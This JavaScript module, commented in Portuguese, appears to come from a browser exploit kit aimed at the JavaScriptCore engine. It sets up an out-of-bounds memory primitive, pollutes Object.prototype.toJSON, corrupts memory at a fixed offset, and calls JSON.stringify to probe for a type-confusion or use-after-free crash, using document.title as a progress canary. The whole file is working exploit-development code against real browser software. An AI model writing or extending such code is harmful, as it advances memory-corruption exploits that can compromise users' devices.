// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const CRITICAL_PARAMS_FOR_MINIMAL_TEST = {
    // victim_ab_size: 64, // victim_ab não é o foco principal aqui, mas o object_to_stringify
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    value_to_write: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4,
    ppKey: 'toJSON',
    description: "CrashTest_SuperMinimal_toJSON_0x70_FFFF"
};

let callCount_toJSON_super_minimal = 0;

// toJSON Super Minimalista
function toJSON_SuperMinimal() {
    callCount_toJSON_super_minimal++;
    // Apenas um canary via document.title para ver se foi chamada.
    // Evitar logS3 aqui para máxima simplicidade e para não ser o ponto de falha.
    document.title = `toJSON_SuperMinimal Call ${callCount_toJSON_super_minimal}`;
    return { minimal_payload: true, call: callCount_toJSON_super_minimal }; // Retorna um objeto simples
    // Alternativamente, teste com: return undefined;
}

export async function runMinimalToJSONCrashTest() {
    const FNAME = CRITICAL_PARAMS_FOR_MINIMAL_TEST.description; 
    logS3(`--- Iniciando Teste de Crash com toJSON Super Minimalista: ${FNAME} ---`, "test", FNAME);
    document.title = "Iniciando: " + FNAME;

    callCount_toJSON_super_minimal = 0; // Resetar contador
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup.", "error", FNAME); 
        document.title = "ERRO OOB Setup - " + FNAME;
        return;
    }
    document.title = "OOB OK - " + FNAME;

    // O objeto que será passado para JSON.stringify
    let object_to_stringify = { data: "test_data_for_minimal_json" };
    logS3(`object_to_stringify criado: ${JSON.stringify(object_to_stringify)} (Este stringify usa toJSON nativo, se houver)`, "info", FNAME);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, CRITICAL_PARAMS_FOR_MINIMAL_TEST.ppKey);
    let pollutionApplied = false;
    let stepReached = "antes_pp";
    let potentiallyCrashed = true; // Assumir que vai crashar/congelar

    try {
        stepReached = "aplicando_pp";
        logS3(`Poluindo Object.prototype.${CRITICAL_PARAMS_FOR_MINIMAL_TEST.ppKey} com toJSON_SuperMinimal...`, "info", FNAME);
        document.title = "Aplicando PP SuperMinimal - " + FNAME;
        Object.defineProperty(Object.prototype, CRITICAL_PARAMS_FOR_MINIMAL_TEST.ppKey, {
            value: toJSON_SuperMinimal,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`PP aplicada com toJSON_SuperMinimal.`, "good", FNAME);
        stepReached = "pp_aplicada";
        document.title = "PP SuperMinimal OK - " + FNAME;

        stepReached = "antes_escrita_oob";
        logS3(`CORRUPÇÃO: ${toHex(CRITICAL_PARAMS_FOR_MINIMAL_TEST.value_to_write)} @ ${toHex(CRITICAL_PARAMS_FOR_MINIMAL_TEST.corruption_offset)}`, "warn", FNAME);
        document.title = "Antes OOB Write SuperMinimal - " + FNAME;
        oob_write_absolute(CRITICAL_PARAMS_FOR_MINIMAL_TEST.corruption_offset, CRITICAL_PARAMS_FOR_MINIMAL_TEST.value_to_write, CRITICAL_PARAMS_FOR_MINIMAL_TEST.bytes_to_write_for_corruption);
        logS3("Escrita OOB feita.", "info", FNAME);
        stepReached = "apos_escrita_oob";
        document.title = "Após OOB Write SuperMinimal - " + FNAME;

        await PAUSE_S3(SHORT_PAUSE_S3);

        stepReached = "antes_stringify_super_minimal";
        document.title = `Antes Stringify SuperMinimal - ${FNAME}`;
        logS3(`Chamando JSON.stringify para object_to_stringify (com toJSON SuperMinimal)...`, "info", FNAME);
        let stringifyResult = null;
        try {
            stringifyResult = JSON.stringify(object_to_stringify); // PONTO CRÍTICO
            stepReached = `apos_stringify_super_minimal`;
            potentiallyCrashed = false; // Se chegou aqui, não crashou/congelou
            document.title = `Strfy SuperMinimal OK - ${FNAME}`;
            logS3(`Resultado JSON.stringify(object_to_stringify): ${String(stringifyResult).substring(0, 100)}... (Chamadas toJSON: ${callCount_toJSON_super_minimal})`, "info", FNAME);
        } catch (e) {
            stepReached = `erro_stringify_super_minimal`;
            potentiallyCrashed = false; // Erro JS capturável, não um crash/congelamento
            document.title = `ERRO Strfy SuperMinimal - ${FNAME}`;
            logS3(`ERRO JSON.stringify(object_to_stringify): ${e.name} - ${e.message}. (Chamadas toJSON: ${callCount_toJSON_super_minimal})`, "critical", FNAME);
            console.error(`JSON.stringify ERROR for object_to_stringify (SuperMinimal):`, e);
        }
    } catch (mainError) {
        potentiallyCrashed = false; // Erro JS capturável
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME);
        document.title = "ERRO Principal SuperMinimal - " + FNAME;
        console.error("Main test error (SuperMinimal):", mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, CRITICAL_PARAMS_FOR_MINIMAL_TEST.ppKey, originalToJSONDescriptor);
            else delete Object.prototype[CRITICAL_PARAMS_FOR_MINIMAL_TEST.ppKey];
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}`, "info", FNAME);
        if (potentiallyCrashed) { // Se não chegou a `apos_stringify` ou um erro explícito
             document.title = `CONGELOU? ${stepReached} - ${FNAME}`;
             logS3(`O TESTE PODE TER CONGELADO/CRASHADO em ${stepReached}. Chamadas toJSON: ${callCount_toJSON_super_minimal}`, "error", FNAME);
        }
    }
    logS3(`--- Teste de Crash com toJSON Super Minimalista Concluído: ${FNAME} (Chamadas toJSON: ${callCount_toJSON_super_minimal}) ---`, "test", FNAME);
}

// Para ser chamado por runAllAdvancedTestsS3.mjs
export async function testJsonTypeConfusionUAFSpeculative() {
    await runMinimalToJSONCrashTest();
}
